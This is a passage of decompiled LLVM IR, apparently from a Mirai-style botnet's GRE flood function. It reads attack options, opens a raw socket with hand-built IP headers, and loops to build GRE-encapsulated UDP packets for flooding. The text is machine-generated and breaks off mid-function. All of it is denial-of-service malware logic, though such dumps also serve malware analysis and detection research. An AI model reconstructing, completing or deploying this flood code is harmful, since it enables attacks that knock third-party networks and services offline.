  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_9a6c = load i32, i32* @r4, align 4
  %v6_9a6c = load i32, i32* @r5, align 4
  %v24_9a6c = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @sl, align 4
  %v2_9a88 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_9a8c = load i32, i32* @r5, align 4
  store i32 %v0_9a8c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9a9c = load i32, i32* @r4, align 4
  %v5_9aa0 = inttoptr i32 %v0_9a8c to i32*
  %v6_9aa0 = call i32 @attack_get_opt_int(i32 %v0_9a9c, i32* %v5_9aa0, i32 2, i32 0)
  %v1_9aac = urem i32 %v6_9aa0, 256
  store i32 %v1_9aac, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_9ab8 = load i32, i32* @r5, align 4
  store i32 %v0_9ab8, i32* %r1.global-to-local, align 4
  %v0_9abc = load i32, i32* @r4, align 4
  %v5_9ac0 = trunc i32 %v6_9aa0 to i8
  %v6_9ac4 = inttoptr i32 %v0_9ab8 to i32*
  %v7_9ac4 = call i32 @attack_get_opt_int(i32 %v0_9abc, i32* %v6_9ac4, i32 3, i32 65535)
  %v0_9ac8 = load i32, i32* @r5, align 4
  store i32 %v0_9ac8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_9ac4, i32* %fp.global-to-local, align 4
  %v0_9ad8 = load i32, i32* @r4, align 4
  %v4_9adc = inttoptr i32 %v0_9ac8 to i32*
  %v5_9adc = call i32 @attack_get_opt_int(i32 %v0_9ad8, i32* %v4_9adc, i32 4, i32 64)
  %v1_9ae4 = urem i32 %v5_9adc, 256
  store i32 %v1_9ae4, i32* %ip.global-to-local, align 4
  %v0_9ae8 = load i32, i32* @r5, align 4
  store i32 %v0_9ae8, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9af4 = load i32, i32* @r4, align 4
  %v6_9afc = inttoptr i32 %v0_9ae8 to i32*
  %v7_9afc = call i32 @attack_get_opt_int(i32 %v0_9af4, i32* %v6_9afc, i32 5, i32 1)
  %v1_9b08 = urem i32 %v7_9afc, 256
  store i32 %v1_9b08, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_9b14 = load i32, i32* @r5, align 4
  store i32 %v0_9b14, i32* %r1.global-to-local, align 4
  %v0_9b18 = load i32, i32* @r4, align 4
  %v5_9b20 = inttoptr i32 %v0_9b14 to i32*
  %v6_9b20 = call i32 @attack_get_opt_int(i32 %v0_9b18, i32* %v5_9b20, i32 6, i32 65535)
  %v0_9b28 = load i32, i32* @r5, align 4
  store i32 %v0_9b28, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_9b20, i32* @r8, align 4
  %v0_9b38 = load i32, i32* @r4, align 4
  %v4_9b3c = inttoptr i32 %v0_9b28 to i32*
  %v5_9b3c = call i32 @attack_get_opt_int(i32 %v0_9b38, i32* %v4_9b3c, i32 7, i32 65535)
  %v0_9b40 = load i32, i32* @r5, align 4
  store i32 %v0_9b40, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_9b3c, i32* @r7, align 4
  %v0_9b50 = load i32, i32* @r4, align 4
  %v4_9b54 = inttoptr i32 %v0_9b40 to i32*
  %v5_9b54 = call i32 @attack_get_opt_int(i32 %v0_9b50, i32* %v4_9b54, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9b64 = load i32, i32* @r5, align 4
  store i32 %v0_9b64, i32* %r1.global-to-local, align 4
  %v0_9b68 = load i32, i32* @r4, align 4
  %v4_9b6c = inttoptr i32 %v0_9b64 to i32*
  %v5_9b6c = call i32 @attack_get_opt_int(i32 %v0_9b68, i32* %v4_9b6c, i32 1, i32 1)
  %v1_9b74 = urem i32 %v5_9b6c, 256
  store i32 %v1_9b74, i32* %ip.global-to-local, align 4
  %v0_9b78 = load i32, i32* @r5, align 4
  store i32 %v0_9b78, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9b84 = load i32, i32* @r4, align 4
  %v5_9b8c = inttoptr i32 %v0_9b78 to i32*
  %v6_9b8c = call i32 @attack_get_opt_int(i32 %v0_9b84, i32* %v5_9b8c, i32 19, i32 0)
  %v0_9b94 = load i32, i32* @r5, align 4
  store i32 %v0_9b94, i32* %r1.global-to-local, align 4
  %v2_9b98 = load i32, i32* @global_var_243d4.57, align 4
  store i32 %v2_9b98, i32* %r3.global-to-local, align 4
  store i32 %v6_9b8c, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_9ba4 = load i32, i32* @r4, align 4
  %v4_9ba8 = inttoptr i32 %v0_9b94 to i32*
  %v5_9ba8 = call i32 @attack_get_opt_int(i32 %v0_9ba4, i32* %v4_9ba8, i32 25, i32 %v2_9b98)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_9bbc = call i32 @socket(i32 2, i32 3, i32 6)
  %v7_9bc0 = icmp eq i32 %v3_9bbc, -1
  store i1 %v7_9bc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9bc0, label %dec_label_pc_a060, label %dec_label_pc_9bcc

dec_label_pc_9bcc:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_9bd4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_9bd4, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_9be8 = call i32 @__GI_setsockopt(i32 %v3_9bbc, i32 0, i32 3, i32 %v6_9bd4, i32 4)
  %v7_9bec = icmp eq i32 %v5_9be8, -1
  store i1 %v7_9bec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9bec, label %dec_label_pc_a058, label %dec_label_pc_9bf4

dec_label_pc_9bf4:                                ; preds = %dec_label_pc_9bcc
  %v0_9bf4 = load i32, i32* @r8, align 4
  %v0_9bf8 = load i32, i32* @r7, align 4
  %v0_9bfc = load i32, i32* %fp.global-to-local, align 4
  %v0_9c00 = load i32, i32* @r6, align 4
  %v1_9c00 = urem i32 %v0_9c00, 256
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_9c08 = urem i32 %v0_9bf4, 65536
  store i32 %v3_9c08, i32* %r3.global-to-local, align 4
  %v3_9c0c = urem i32 %v0_9bf8, 65536
  store i32 %v3_9c0c, i32* %r4.global-to-local, align 4
  %v0_9c10 = load i32, i32* @sl, align 4
  %v2_9c10 = icmp eq i32 %v0_9c10, 0
  store i1 %v2_9c10, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_9c28 = urem i32 %v0_9bfc, 65536
  store i32 %v3_9c28, i32* @fp, align 4
  br i1 %v2_9c10, label %dec_label_pc_a06c, label %dec_label_pc_9c38

dec_label_pc_9c38:                                ; preds = %dec_label_pc_9bf4
  %v3_9bf8 = mul i32 %v0_9bf8, 65536
  %v3_9bf4 = mul i32 %v0_9bf4, 65536
  %v0_9bfc.not = or i32 %v0_9bfc, -65536
  %v1_9c3c = xor i32 %v0_9bfc.not, 65535
  %v3_9c40 = mul i32 %v5_9b54, 65536
  %v1_9c44 = add i32 %v3_9c40, 3407872
  %tmp67 = udiv i32 %v1_9c44, 256
  %v3_9c58 = and i32 %tmp67, 65280
  %tmp68 = mul nsw i32 %v1_9c3c, 256
  %v3_9c5c = and i32 %tmp68, 65280
  store i32 %v3_9c5c, i32* %ip.global-to-local, align 4
  %v1_9c60 = add i32 %v3_9c40, 524288
  %v1_9c68 = add i32 %v3_9c40, 1835008
  %tmp69 = udiv i32 %v1_9c3c, 256
  %v4_9c6c = urem i32 %tmp69, 256
  %v5_9c6c = or i32 %v4_9c6c, %v3_9c5c
  %v4_9c74 = udiv i32 %v1_9c44, 16777216
  %v5_9c74 = or i32 %v3_9c58, %v4_9c74
  store i32 %v5_9c74, i32* @r8, align 4
  %v3_9c80 = udiv i32 %v1_9c68, 256
  %tmp70 = mul i32 %v0_9bfc, 256
  %v3_9c84 = and i32 %tmp70, 65280
  store i32 %v3_9bf4, i32* %r2.global-to-local, align 4
  %tmp71 = udiv i32 %v0_9bfc, 256
  %v4_9c94 = urem i32 %tmp71, 256
  %v5_9c94 = or i32 %v4_9c94, %v3_9c84
  %tmp72 = mul i32 %v0_9bf4, 256
  %v3_9c98 = and i32 %tmp72, 65280
  %v1_9c9c = and i32 %v3_9c80, 65280
  store i32 %v1_9c9c, i32* @r6, align 4
  store i32 %v3_9bf8, i32* %r1.global-to-local, align 4
  %tmp73 = mul i32 %v0_9bf8, 256
  %v3_9ca8 = and i32 %tmp73, 65280
  %tmp74 = udiv i32 %v0_9bf4, 256
  %v4_9cac = urem i32 %tmp74, 256
  %v5_9cac = or i32 %v4_9cac, %v3_9c98
  store i32 %v5_9cac, i32* @lr, align 4
  %v4_9cb0 = udiv i32 %v1_9c68, 16777216
  %v5_9cb0 = or i32 %v1_9c9c, %v4_9cb0
  store i32 %v5_9cb0, i32* %r3.global-to-local, align 4
  %tmp75 = udiv i32 %v0_9bf8, 256
  %v4_9cb4 = urem i32 %tmp75, 256
  %v5_9cb4 = or i32 %v4_9cb4, %v3_9ca8
  %tmp76 = udiv i32 %v1_9c60, 256
  %v3_9cb8 = and i32 %tmp76, 65280
  store i32 %v3_9cb8, i32* @r5, align 4
  %v4_9ccc = udiv i32 %v1_9c60, 16777216
  %v5_9ccc = or i32 %v3_9cb8, %v4_9ccc
  store i32 %v5_9ccc, i32* @r7, align 4
  store i32 0, i32* @r4, align 4
  %v4_9d20 = sext i8 %v5_9ac0 to i32
  %sext12 = mul nuw i32 %v5_9c94, 65536
  %v4_9d3813 = sdiv i32 %sext12, 65536
  %sext8 = mul nuw i32 %v5_9cb0, 65536
  %v4_9d9c = sdiv i32 %sext8, 65536
  %sext9 = mul nuw i32 %v5_9c6c, 65536
  %v4_9da0 = sdiv i32 %sext9, 65536
  %v1_9da8 = trunc i32 %v4_9d9c to i16
  %v2_9dd0 = icmp eq i32 %v1_9c00, 0
  %sext10 = mul nuw i32 %v5_9cac, 65536
  %v4_9df0 = sdiv i32 %sext10, 65536
  %sext11 = mul nuw i32 %v5_9cb4, 65536
  %v4_9df8 = sdiv i32 %sext11, 65536
  %v1_9d30 = trunc i32 %v5_9adc to i8
  br label %dec_label_pc_9cd4

dec_label_pc_9cd4:                                ; preds = %bb82, %dec_label_pc_9c38
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_9ce0 = call i32 @calloc(i32 1510, i32 4)
  store i32 %v2_9a88, i32* %r2.global-to-local, align 4
  %v3_9ce8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9ce8, i32* %r3.global-to-local, align 4
  %v2_9cec = load i32, i32* @r4, align 4
  %v5_9cec = mul i32 %v2_9cec, 4
  %v6_9cec = add i32 %v5_9cec, %v2_9a88
  %v7_9cec = inttoptr i32 %v6_9cec to i32*
  store i32 %v2_9ce0, i32* %v7_9cec, align 4
  %v0_9cf0 = load i32, i32* %r2.global-to-local, align 4
  %v1_9cf0 = load i32, i32* %r3.global-to-local, align 4
  %v4_9cf0 = mul i32 %v1_9cf0, 4
  %v5_9cf0 = add i32 %v4_9cf0, %v0_9cf0
  %v6_9cf0 = inttoptr i32 %v5_9cf0 to i32*
  %v7_9cf0 = load i32, i32* %v6_9cf0, align 4
  store i32 %v7_9cf0, i32* %r4.global-to-local, align 4
  %v1_9cf4 = inttoptr i32 %v7_9cf0 to i8*
  %v2_9cf4 = load i8, i8* %v1_9cf4, align 1
  %tmp = urem i8 %v2_9cf4, 16
  %v1_9cf8 = zext i8 %tmp to i32
  %v1_9cfc = or i32 %v1_9cf8, 64
  store i32 %v1_9cfc, i32* %r2.global-to-local, align 4
  %v1_9d00 = trunc i32 %v1_9cfc to i8
  store i8 %v1_9d00, i8* %v1_9cf4, align 1
  %v0_9d04 = load i32, i32* %r3.global-to-local, align 4
  %v5_9d08 = mul i32 %v0_9d04, 24
  store i32 %v5_9d08, i32* %r1.global-to-local, align 4
  %v0_9d0c = load i32, i32* %r4.global-to-local, align 4
  %v1_9d0c = inttoptr i32 %v0_9d0c to i8*
  %v2_9d0c = load i8, i8* %v1_9d0c, align 1
  %v1_9d10 = and i8 %v2_9d0c, -16
  %v1_9d14 = or i8 %v1_9d10, 5
  store i32 %v1_9b08, i32* %r5.global-to-local, align 4
  store i8 %v1_9d14, i8* %v1_9d0c, align 1
  store i32 %v4_9d20, i32* %r2.global-to-local, align 4
  %v2_9d24 = load i32, i32* %r4.global-to-local, align 4
  %v3_9d24 = add i32 %v2_9d24, 1
  %v4_9d24 = inttoptr i32 %v3_9d24 to i8*
  store i8 %v5_9ac0, i8* %v4_9d24, align 1
  store i32 %v1_9ae4, i32* %r3.global-to-local, align 4
  %v0_9d2c = load i32, i32* %r5.global-to-local, align 4
  %v2_9d2c = icmp eq i32 %v0_9d2c, 0
  store i1 %v2_9d2c, i1* %cpsr_z.global-to-local, align 1
  %v2_9d30 = load i32, i32* %r4.global-to-local, align 4
  %v3_9d30 = add i32 %v2_9d30, 8
  %v4_9d30 = inttoptr i32 %v3_9d30 to i8*
  store i8 %v1_9d30, i8* %v4_9d30, align 1
  %v0_9d34 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9d34, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_9cd4
  store i32 %v4_9d3813, i32* %r5.global-to-local, align 4
  br label %bb77

bb:                                               ; preds = %dec_label_pc_9cd4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v4_9d3813, i32* %r5.global-to-local, align 4
  %v3_9d3c = load i32, i32* %r4.global-to-local, align 4
  %v4_9d3c = add i32 %v3_9d3c, 6
  %v5_9d3c = inttoptr i32 %v4_9d3c to i16*
  store i16 64, i16* %v5_9d3c, align 2
  br label %bb77

bb77:                                             ; preds = %.thread, %bb
  %v2_9d44 = load i32, i32* %r4.global-to-local, align 4
  %v3_9d44 = add i32 %v2_9d44, 9
  %v4_9d44 = inttoptr i32 %v3_9d44 to i8*
  store i8 47, i8* %v4_9d44, align 1
  %v0_9d48 = load i32, i32* %r4.global-to-local, align 4
  %v1_9d48 = add i32 %v0_9d48, 20
  store i32 %v1_9d48, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v0_9d50 = load i32, i32* %r5.global-to-local, align 4
  %v1_9d50 = trunc i32 %v0_9d50 to i16
  %v3_9d50 = add i32 %v0_9d48, 4
  %v4_9d50 = inttoptr i32 %v3_9d50 to i16*
  store i16 %v1_9d50, i16* %v4_9d50, align 2
  %v0_9d54 = load i32, i32* @r8, align 4
  %v1_9d54 = trunc i32 %v0_9d54 to i16
  %v2_9d54 = load i32, i32* %r4.global-to-local, align 4
  %v3_9d54 = add i32 %v2_9d54, 2
  %v4_9d54 = inttoptr i32 %v3_9d54 to i16*
  store i16 %v1_9d54, i16* %v4_9d54, align 2
  %v0_9d58 = load i32, i32* %r3.global-to-local, align 4
  %v1_9d58 = trunc i32 %v0_9d58 to i16
  %v2_9d58 = load i32, i32* %r2.global-to-local, align 4
  %v3_9d58 = add i32 %v2_9d58, 2
  %v4_9d58 = inttoptr i32 %v3_9d58 to i16*
  store i16 %v1_9d58, i16* %v4_9d58, align 2
  store i32 %v5_9ba8, i32* %r3.global-to-local, align 4
  %v0_9d60 = load i32, i32* %r4.global-to-local, align 4
  %v1_9d60 = add i32 %v0_9d60, 24
  %v2_9d60 = inttoptr i32 %v1_9d60 to i8*
  %v3_9d60 = load i8, i8* %v2_9d60, align 1
  %v4_9d60 = zext i8 %v3_9d60 to i32
  store i32 %v4_9d60, i32* %r2.global-to-local, align 4
  %v2_9d64 = add i32 %v0_9d60, 12
  %v3_9d64 = inttoptr i32 %v2_9d64 to i32*
  store i32 %v5_9ba8, i32* %v3_9d64, align 4
  %v0_9d68 = load i32, i32* %r2.global-to-local, align 4
  %v1_9d68 = and i32 %v0_9d68, -241
  %v1_9d6c = or i32 %v1_9d68, 64
  store i32 %v1_9d6c, i32* %r2.global-to-local, align 4
  %v0_9d70 = load i32, i32* %r1.global-to-local, align 4
  %v1_9d70 = load i32, i32* @sb, align 4
  %v2_9d70 = add i32 %v1_9d70, %v0_9d70
  store i32 %v2_9d70, i32* %r1.global-to-local, align 4
  %v1_9d74 = add i32 %v2_9d70, 16
  %v2_9d74 = inttoptr i32 %v1_9d74 to i32*
  %v3_9d74 = load i32, i32* %v2_9d74, align 4
  store i32 %v3_9d74, i32* %r1.global-to-local, align 4
  %v1_9d78 = trunc i32 %v1_9d6c to i8
  %v2_9d78 = load i32, i32* %r4.global-to-local, align 4
  %v3_9d78 = add i32 %v2_9d78, 24
  %v4_9d78 = inttoptr i32 %v3_9d78 to i8*
  store i8 %v1_9d78, i8* %v4_9d78, align 1
  %v0_9d7c = load i32, i32* %r4.global-to-local, align 4
  %v1_9d7c = add i32 %v0_9d7c, 24
  %v2_9d7c = inttoptr i32 %v1_9d7c to i8*
  %v3_9d7c = load i8, i8* %v2_9d7c, align 1
  %v1_9d80 = and i8 %v3_9d7c, -16
  %v1_9d84 = or i8 %v1_9d80, 5
  store i8 %v1_9d84, i8* %v2_9d7c, align 1
  %v0_9d8c = load i32, i32* %r1.global-to-local, align 4
  %v1_9d8c = load i32, i32* %r4.global-to-local, align 4
  %v2_9d8c = add i32 %v1_9d8c, 16
  %v3_9d8c = inttoptr i32 %v2_9d8c to i32*
  store i32 %v0_9d8c, i32* %v3_9d8c, align 4
  %v0_9d94 = load i32, i32* %r4.global-to-local, align 4
  %v1_9d94 = add i32 %v0_9d94, 24
  store i32 %v1_9d94, i32* @r5, align 4
  %v3_9d98 = add i32 %v0_9d94, 25
  %v4_9d98 = inttoptr i32 %v3_9d98 to i8*
  store i8 %v5_9ac0, i8* %v4_9d98, align 1
  store i32 %v4_9d9c, i32* %r2.global-to-local, align 4
  store i32 %v4_9da0, i32* %r3.global-to-local, align 4
  store i32 %v1_9ae4, i32* %r1.global-to-local, align 4
  %v2_9da8 = load i32, i32* @r5, align 4
  %v3_9da8 = add i32 %v2_9da8, 2
  %v4_9da8 = inttoptr i32 %v3_9da8 to i16*
  store i16 %v1_9da8, i16* %v4_9da8, align 2
  %v0_9dac = load i32, i32* %r3.global-to-local, align 4
  %v1_9dac = trunc i32 %v0_9dac to i16
  %v2_9dac = load i32, i32* @r5, align 4
  %v3_9dac = add i32 %v2_9dac, 4
  %v4_9dac = inttoptr i32 %v3_9dac to i16*
  store i16 %v1_9dac, i16* %v4_9dac, align 2
  %v0_9db0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9db0, label %bb79, label %bb78

bb78:                                             ; preds = %bb77
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %bb77, %bb78
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_9db8 = load i32, i32* %r1.global-to-local, align 4
  %v1_9db8 = trunc i32 %v0_9db8 to i8
  %v2_9db8 = load i32, i32* @r5, align 4
  %v3_9db8 = add i32 %v2_9db8, 8
  %v4_9db8 = inttoptr i32 %v3_9db8 to i8*
  store i8 %v1_9db8, i8* %v4_9db8, align 1
  %v0_9dbc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9dbc, label %bb81, label %bb80

bb80:                                             ; preds = %bb79
  %v1_9dbc = load i32, i32* %r2.global-to-local, align 4
  %v2_9dbc = trunc i32 %v1_9dbc to i16
  %v3_9dbc = load i32, i32* @r5, align 4
  %v4_9dbc = add i32 %v3_9dbc, 6
  %v5_9dbc = inttoptr i32 %v4_9dbc to i16*
  store i16 %v2_9dbc, i16* %v5_9dbc, align 2
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v0_9dc0 = load i32, i32* %r3.global-to-local, align 4
  %v1_9dc0 = trunc i32 %v0_9dc0 to i8
  %v2_9dc0 = load i32, i32* @r5, align 4
  %v3_9dc0 = add i32 %v2_9dc0, 9
  %v4_9dc0 = inttoptr i32 %v3_9dc0 to i8*
  store i8 %v1_9dc0, i8* %v4_9dc0, align 1
  %v0_9dc4 = call i32 @rand_next()
  store i32 %v1_9c00, i32* %r1.global-to-local, align 4
  store i1 %v2_9dd0, i1* %cpsr_z.global-to-local, align 1
  %v1_9dd4 = sub i32 1023, %v0_9dc4
  store i32 %v1_9dd4, i32* %r3.global-to-local, align 4
  br i1 %v2_9dd0, label %.thread14, label %.thread15

.thread14:                                        ; preds = %bb81
  %v2_9ddc = load i32, i32* @r5, align 4
  %v3_9ddc = add i32 %v2_9ddc, 16
  %v4_9ddc = inttoptr i32 %v3_9ddc to i32*
  store i32 %v1_9dd4, i32* %v4_9ddc, align 4
  br label %bb82

.thread15:                                        ; preds = %bb81
  %v1_9dd8 = load i32, i32* %r4.global-to-local, align 4
  %v2_9dd8 = add i32 %v1_9dd8, 16
  %v3_9dd8 = inttoptr i32 %v2_9dd8 to i32*
  %v4_9dd8 = load i32, i32* %v3_9dd8, align 4
  store i32 %v4_9dd8, i32* %r3.global-to-local, align 4
  %v2_9de0 = load i32, i32* @r5, align 4
  %v3_9de0 = add i32 %v2_9de0, 16
  %v4_9de0 = inttoptr i32 %v3_9de0 to i32*
  store i32 %v4_9dd8, i32* %v4_9de0, align 4
  br label %bb82

bb82:                                             ; preds = %.thread14, %.thread15
  %v1_9de4 = load i32, i32* @r5, align 4
  %v2_9de4 = add i32 %v1_9de4, 12
  %v3_9de4 = inttoptr i32 %v2_9de4 to i32*
  store i32 %v0_9dc4, i32* %v3_9de4, align 4
  %v3_9de8 = load i32, i32* %stack_var_-44, align 4
  %v0_9dec = load i32, i32* %r4.global-to-local, align 4
  %v1_9dec = add i32 %v0_9dec, 44
  store i32 %v1_9dec, i32* @r6, align 4
  store i32 %v4_9df0, i32* %r2.global-to-local, align 4
  %v1_9df4 = add i32 %v3_9de8, 1
  store i32 %v1_9df4, i32* @r4, align 4
  store i32 %v4_9df8, i32* %r3.global-to-local, align 4
  %v1_9dfc = load i32, i32* @sl, align 4
  %v9_9dfc = icmp eq i32 %v1_9df4, %v1_9dfc
  store i1 %v9_9dfc, i1* %cpsr_z.global-to-local, align 1
  %v0_9e00 = load i32, i32* @r7, align 4
  %v1_9e00 = trunc i32 %v0_9e00 to i16
  %v3_9e00 = add i32 %v0_9dec, 48
  %v4_9e00 = inttoptr i32 %v3_9e00 to i16*
  store i16 %v1_9e00, i16* %v4_9e00, align 2
  %v0_9e04 = load i32, i32* %r2.global-to-local, align 4
  %v1_9e04 = trunc i32 %v0_9e04 to i16
  %v2_9e04 = load i32, i32* @r6, align 4
  %v3_9e04 = inttoptr i32 %v2_9e04 to i16*
  store i16 %v1_9e04, i16* %v3_9e04, align 2
  %v0_9e08 = load i32, i32* %r3.global-to-local, align 4
  %v1_9e08 = trunc i32 %v0_9e08 to i16
  %v2_9e08 = load i32, i32* @r6, align 4
  %v3_9e08 = add i32 %v2_9e08, 2
  %v4_9e08 = inttoptr i32 %v3_9e08 to i16*
  store i16 %v1_9e08, i16* %v4_9e08, align 2
  %v0_9e0c = load i32, i32* @r4, align 4
  store i32 %v0_9e0c, i32* %stack_var_-44, align 4
  %v5_9e10 = icmp slt i32 %v1_9df4, %v1_9dfc
  br i1 %v5_9e10, label %dec_label_pc_9cd4, label %dec_label_pc_9e14

dec_label_pc_9e14:                                ; preds = %bb82
  store i32 %v5_9b54, i32* %r5.global-to-local, align 4
  %v1_9e1c = add i32 %v5_9b54, 8
  store i32 %v1_9e1c, i32* %r4.global-to-local, align 4
  %v0_9e2c.pre.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_9e28.preheader

dec_label_pc_9e28.preheader:                      ; preds = %dec_label_pc_9e14, %dec_label_pc_a06c
  %v0_9e2c.pre = phi i32 [ %v0_9e2c.pre.pre, %dec_label_pc_9e14 ], [ 0, %dec_label_pc_a06c ]
  %stack_var_-124.0.ph = phi i32 [ %v1_9e1c, %dec_label_pc_9e14 ], [ %v1_a074, %dec_label_pc_a06c ]
  %storemerge = add i32 %v5_9b54, 52
  store i32 %storemerge, i32* @r8, align 4
  %v2_a020 = icmp eq i32 %v1_9c00, 0
  %v2_a03c = icmp eq i32 %v1_9b74, 0
  %v2_9e68 = icmp eq i32 %v5_9ba8, -1
  %v7_9e68 = icmp eq i32 %v5_9ba8, -1
  br label %dec_label_pc_9e28

dec_label_pc_9e28:                                ; preds = %dec_label_pc_9e28, %dec_label_pc_9eb8, %dec_label_pc_9e28.preheader
  %v0_9e2c = phi i32 [ %v0_9e2c.pre, %dec_label_pc_9e28.preheader ], [ 0, %dec_label_pc_9e28 ], [ %v1_9f54, %dec_label_pc_9eb8 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_9e2c = icmp eq i32 %v0_9e2c, 0
  store i1 %v2_9e2c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_9e2c, label %dec_label_pc_9e28, label %dec_label_pc_9e38

dec_label_pc_9e38:                                ; preds = %dec_label_pc_9e28
  br label %dec_label_pc_9e3c

dec_label_pc_9e3c:                                ; preds = %dec_label_pc_9eb8, %dec_label_pc_9e38
  %v1_9e50 = phi i32 [ %v1_9f50, %dec_label_pc_9eb8 ], [ 0, %dec_label_pc_9e38 ]
  %v5_9e40 = mul i32 %v1_9e50, 24
  %v1_9e44 = load i32, i32* @sb, align 4
  %v2_9e44 = add i32 %v1_9e44, %v5_9e40
  store i32 %v2_9e44, i32* %r3.global-to-local, align 4
  store i32 %v2_9a88, i32* %r4.global-to-local, align 4
  %v1_9e4c = add i32 %v2_9e44, 20
  %v2_9e4c = inttoptr i32 %v1_9e4c to i8*
  %v3_9e4c = load i8, i8* %v2_9e4c, align 1
  %v4_9e4c = zext i8 %v3_9e4c to i32
  store i32 %v4_9e4c, i32* %r2.global-to-local, align 4
  %v4_9e50 = mul i32 %v1_9e50, 4
  %v5_9e50 = add i32 %v4_9e50, %v2_9a88
  %v6_9e50 = inttoptr i32 %v5_9e50 to i32*
  %v7_9e50 = load i32, i32* %v6_9e50, align 4
  store i32 %v7_9e50, i32* @r5, align 4
  %v7_9e54 = icmp eq i8 %v3_9e4c, 31
  store i1 %v7_9e54, i1* %cpsr_z.global-to-local, align 1
  %v1_9e58 = add i32 %v7_9e50, 24
  store i32 %v1_9e58, i32* @r6, align 4
  %v1_9e5c = add i32 %v7_9e50, 44
  store i32 %v1_9e5c, i32* @r7, align 4
  %tmp86 = icmp ult i8 %v3_9e4c, 32
  br i1 %tmp86, label %dec_label_pc_9f64, label %dec_label_pc_9e64

dec_label_pc_9e64:                                ; preds = %dec_label_pc_9e3c
  store i32 %v5_9ba8, i32* %r1.global-to-local, align 4
  store i1 %v7_9e68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9e68, label %dec_label_pc_9fc4, label %dec_label_pc_9e70

dec_label_pc_9e70:                                ; preds = %dec_label_pc_9f64, %dec_label_pc_9e64
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_9e78 = load i32, i32* @fp, align 4
  %v9_9e78 = icmp eq i32 %v0_9e78, 65535
  store i1 %v9_9e78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9e78, label %dec_label_pc_9fdc, label %dec_label_pc_9e80

dec_label_pc_9e80:                                ; preds = %dec_label_pc_9fc4.dec_label_pc_9e80_crit_edge, %dec_label_pc_9e70
  %v1_9e84 = phi i32 [ %v1_9e84.pre, %dec_label_pc_9fc4.dec_label_pc_9e80_crit_edge ], [ 65535, %dec_label_pc_9e70 ]
  store i32 %v3_9c08, i32* %r2.global-to-local, align 4
  %v9_9e84 = icmp eq i32 %v3_9c08, %v1_9e84
  store i1 %v9_9e84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9e84, label %dec_label_pc_a004, label %dec_label_pc_9e8c

dec_label_pc_9e8c:                                ; preds = %dec_label_pc_9fdc.dec_label_pc_9e8c_crit_edge, %dec_label_pc_9e80
  %v1_9e90 = phi i32 [ %v1_9e90.pre, %dec_label_pc_9fdc.dec_label_pc_9e8c_crit_edge ], [ %v1_9e84, %dec_label_pc_9e80 ]
  store i32 %v3_9c0c, i32* %r3.global-to-local, align 4
  %v9_9e90 = icmp eq i32 %v3_9c0c, %v1_9e90
  store i1 %v9_9e90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9e90, label %dec_label_pc_a018, label %dec_label_pc_9e98

dec_label_pc_9e98:                                ; preds = %dec_label_pc_a004, %dec_label_pc_9e8c
  store i32 %v1_9c00, i32* @r4, align 4
  store i1 %v2_a020, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a020, label %dec_label_pc_a034, label %.thread16

